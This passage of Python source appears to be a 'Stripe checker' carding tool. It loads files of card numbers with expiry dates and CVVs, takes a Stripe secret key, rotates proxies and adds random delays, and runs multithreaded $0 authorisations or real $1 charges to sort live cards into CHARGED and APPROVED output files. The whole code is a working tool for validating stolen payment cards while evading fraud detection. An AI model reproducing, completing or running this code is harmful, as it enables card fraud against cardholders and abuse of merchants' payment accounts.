                line = line.strip()
                if not line:
                    continue
                
                # Parse card format: CC|MM|YYYY|CVV
                parts = line.split('|')
                if len(parts) >= 4:
                    card = CardDetails(
                        number=parts[0].strip().replace(' ', ''),
                        exp_month=parts[1].strip(),
                        exp_year=parts[2].strip(),
                        cvv=parts[3].strip()
                    )
                    cards.append((line, card))
                else:
                    print(f"{Fore.YELLOW}⚠️  Invalid format on line {line_num}: {line}")
        
        except Exception as e:
            print(f"{Fore.RED}❌ Error loading cards: {e}")
        
        return cards

    async def process_card_batch(self, cards_batch: List[Tuple[str, CardDetails]], 
                                progress_bar: tqdm, worker_id: int = 0):
        """Process a batch of cards"""
        for card_str, card in cards_batch:
            try:
                # Get proxy if available
                proxy_url = None
                if self.proxies:
                    proxy_url = self.get_next_proxy()
                
                # Test card
                result = await self.test_single_card(card, proxy_url, card_str)
                
                # Categorize result
                category = self.categorize_result(result, card_str)
                
                # Save result
                self.results_manager.save_result(card_str, result, category)
                
                # Display result
                if category == "charged":
                    progress_bar.write(f"{Fore.GREEN}[Worker {worker_id}] CHARGED: {card_str[:30]}...")
                elif category == "approved":
                    progress_bar.write(f"{Fore.CYAN}[Worker {worker_id}] APPROVED: {card_str[:30]}... - {result['message'][:50]}")
                elif category == "declined":
                    progress_bar.write(f"{Fore.RED}[Worker {worker_id}] DECLINED: {card_str[:30]}... - {result['message'][:50]}")
                else:  # error
                    progress_bar.write(f"{Fore.YELLOW}[Worker {worker_id}] ERROR: {card_str[:30]}... - {result['message'][:50]}")
                
                # Update progress bar
                progress_bar.update(1)
                
                # Random delay between cards
                await asyncio.sleep(random.uniform(0.5, 2.0))
                
            except Exception as e:
                error_result = {
                    "card": card_str,
                    "success": False,
                    "status": "error",
                    "message": str(e)
                }
                self.results_manager.save_result(card_str, error_result, "error")
                progress_bar.write(f"{Fore.YELLOW}[Worker {worker_id}] ERROR: {card_str[:30]}... - {str(e)[:50]}")
                progress_bar.update(1)

    async def batch_process_cards(self, cards: List[Tuple[str, CardDetails]], threads: int):
        """Process multiple cards with multi-threading"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}BATCH PROCESSING {len(cards)} CARDS")
        print(f"{Fore.YELLOW}Using {threads} threads")
        print(f"{Fore.YELLOW}Test Mode: {'$0 Auth (Safe)' if self.test_mode == 1 else '$1 Charge (Real Charge)'}")
        print(f"{Fore.CYAN}{'='*60}")
        
        # Initialize results manager
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = f"results_{timestamp}"
        self.results_manager = ResultsManager(output_dir)
        
        # Split cards into batches for each thread
        batch_size = len(cards) // threads
        if len(cards) % threads != 0:
            batch_size += 1
        
        batches = []
        for i in range(0, len(cards), batch_size):
            batch = cards[i:i + batch_size]
            batches.append(batch)
        
        # Create progress bar
        with tqdm(total=len(cards), desc="Processing", unit="card", ncols=100, 
                 bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as pbar:
            
            # Create tasks for each worker
            tasks = []
            for i, batch in enumerate(batches):
                task = self.process_card_batch(batch, pbar, i + 1)
                tasks.append(task)
            
            # Run all tasks concurrently
            await asyncio.gather(*tasks)
        
        # Save final statistics
        self.results_manager.save_stats()
        
        # Display final statistics
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}BATCH PROCESSING COMPLETE")
        print(f"{Fore.CYAN}{'='*60}")
        self.results_manager.print_stats()
        
        print(f"\n{Fore.GREEN}📁 Results saved in directory: {output_dir}/")
        print(f"{Fore.GREEN}💳 CHARGED.TXT - Cards that were charged $1: {output_dir}/CHARGED.txt")
        print(f"{Fore.GREEN}✅ APPROVED_ALL.TXT - All approved cards (CCN/CVV/Insufficient funds/etc): {output_dir}/APPROVED_ALL.txt")
        print(f"{Fore.RED}❌ DECLINED.TXT - Declined cards: {output_dir}/DECLINED.txt")
        print(f"{Fore.YELLOW}⚠️  ERROR_WITH_RESPONSE.TXT - Errors with full response: {output_dir}/ERROR_WITH_RESPONSE.txt")
        print(f"{Fore.CYAN}📊 STATS.json - Statistics: {output_dir}/STATS.json")
        print(f"{Fore.CYAN}📝 RAW_RESPONSES.json - All raw responses: {output_dir}/RAW_RESPONSES.json")

    def display_account_info(self):
        """Display account information"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}ACCOUNT INFORMATION")
        print(f"{Fore.CYAN}{'='*60}")
        
        if self.account:
            print(f"{Fore.GREEN}SK: {self.account.sk[:20]}...{self.account.sk[-4:]}")
            print(f"{Fore.GREEN}PK: {self.account.pk[:20]}...{self.account.pk[-4:]}")
            print(f"{Fore.GREEN}Account ID: {self.account.account_id}")
            print(f"{Fore.GREEN}Business: {self.account.business_name}")
            print(f"{Fore.GREEN}Country: {self.account.country}")
            print(f"{Fore.GREEN}Charges Enabled: {'✅ Yes' if self.account.charges_enabled else '❌ No'}")
            print(f"{Fore.GREEN}Payouts Enabled: {'✅ Yes' if self.account.payouts_enabled else '❌ No'}")
            print(f"{Fore.GREEN}Balance: {self.account.currency} {self.account.balance:.2f}")

    async def main_flow(self):
        """Main interactive flow"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}ADVANCED STRIPE CHECKER - Multi-Threaded Batch Tool")
        print(f"{Fore.CYAN}{'='*60}")
        
        # Get SK
        sk = input(f"\n{Fore.CYAN}Enter Stripe SK: ").strip()
        
        if not sk.startswith('sk_'):
            print(f"{Fore.RED}❌ Invalid SK format. Must start with 'sk_'")
            return
        
        # Get cards file
        cards_file = input(f"\n{Fore.CYAN}Enter CC combo file location: ").strip()
        if not os.path.exists(cards_file):
            print(f"{Fore.RED}❌ File not found: {cards_file}")
            return
        
        # Get proxy file
        proxy_file = input(f"\n{Fore.CYAN}Enter proxy file location (press Enter to skip): ").strip()
        if proxy_file and os.path.exists(proxy_file):
            self.load_proxies(proxy_file)
        
        # Get number of threads
        while True:
            try:
                threads_input = input(f"\n{Fore.CYAN}Enter number of threads to use (1-50, default 5): ").strip()
                if not threads_input:
                    self.threads = 5
                    break
                
                self.threads = int(threads_input)
                if 1 <= self.threads <= 50:
                    break
                else:
                    print(f"{Fore.RED}❌ Please enter a number between 1 and 50")
            except ValueError:
                print(f"{Fore.RED}❌ Please enter a valid number")
        
        # Load cards
        cards = self.load_cards_from_file(cards_file)
        if not cards:
            print(f"{Fore.RED}❌ No valid cards found in file")
            return
        
        print(f"{Fore.GREEN}✅ Loaded {len(cards)} cards from file")
        
        # Ask for test mode
        print(f"\n{Fore.CYAN}Select test mode:")
        print(f"{Fore.GREEN}1. $0 Auth (SetupIntent - safe)")
        print(f"{Fore.GREEN}2. $1 Charge (PaymentIntent - real charge)")
        
        while True:
            test_mode = input(f"{Fore.YELLOW}Choice (1-2): ").strip()
            if test_mode in ["1", "2"]:
                self.test_mode = int(test_mode)
                break
            else:
                print(f"{Fore.RED}❌ Please enter 1 or 2")
        
        if self.test_mode == 2:
            confirm = input(f"{Fore.RED}⚠️  WARNING: This will charge $1 for each card! Type 'YES' to confirm: ").strip()
            if confirm != "YES":
                print(f"{Fore.YELLOW}Cancelled.")
                return
        
        # Initialize with first proxy
        proxy_url = None
        if self.proxies:
            proxy_url = self.get_next_proxy()
        
        # Create session and validate SK
        async with await self.create_session(proxy_url) as session:
            # Validate SK
            print(f"\n{Fore.YELLOW}Validating SK...")
            valid, account_info = await self.validate_sk(session, sk)
            
            if not valid:
                print(f"{Fore.RED}❌ Invalid SK: {account_info.get('error', 'Unknown error')}")
                return
            
            # Extract PK
            pk = await self.extract_pk(session)
            if not pk:
                print(f"{Fore.RED}❌ Could not extract PK. Exiting.")
                return
            
            # Display account info
            self.display_account_info()
        
        # Start batch processing
        print(f"\n{Fore.YELLOW}Starting batch processing with {self.threads} threads...")
        await self.batch_process_cards(cards, self.threads)

async def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description="Advanced Stripe Checker - Multi-Threaded Batch Processing")
    parser.add_argument("--sk", help="Stripe Secret Key")
    parser.add_argument("--cards", help="Cards file path")
    parser.add_argument("--proxies", help="Proxy file path")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads (default: 5)")
    parser.add_argument("--mode", type=int, choices=[1, 2], default=1, help="Test mode: 1=$0 auth, 2=$1 charge")
    
    args = parser.parse_args()
    
    checker = AdvancedStripeChecker()
    
    if args.sk and args.cards:
        # Command line mode
        cards = checker.load_cards_from_file(args.cards)
        if not cards:
            print(f"{Fore.RED}❌ No valid cards found")
            return
        
        # Load proxies if provided
        if args.proxies:
            checker.load_proxies(args.proxies)
        
        checker.threads = args.threads
        checker.test_mode = args.mode
        
        if checker.test_mode == 2:
            print(f"{Fore.RED}⚠️  WARNING: Running in $1 charge mode!")
        
        # Initialize with first proxy
        proxy_url = None
        if checker.proxies:
            proxy_url = checker.get_next_proxy()
        
        # Create session and validate SK
        async with await checker.create_session(proxy_url) as session:
            # Validate SK
            valid, _ = await checker.validate_sk(session, args.sk)
            if not valid:
                print(f"{Fore.RED}❌ Invalid SK")
                return
            
            # Extract PK
            pk = await checker.extract_pk(session)
            if not pk:
                return
        
        # Process cards
        await checker.batch_process_cards(cards, checker.threads)
    else:
        # Interactive mode
        await checker.main_flow()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⚠️  Interrupted by user")
    except Exception as e:
        print(f"\n{Fore.RED}❌ Error: {str(e)}")
        import traceback
        traceback.print_exc()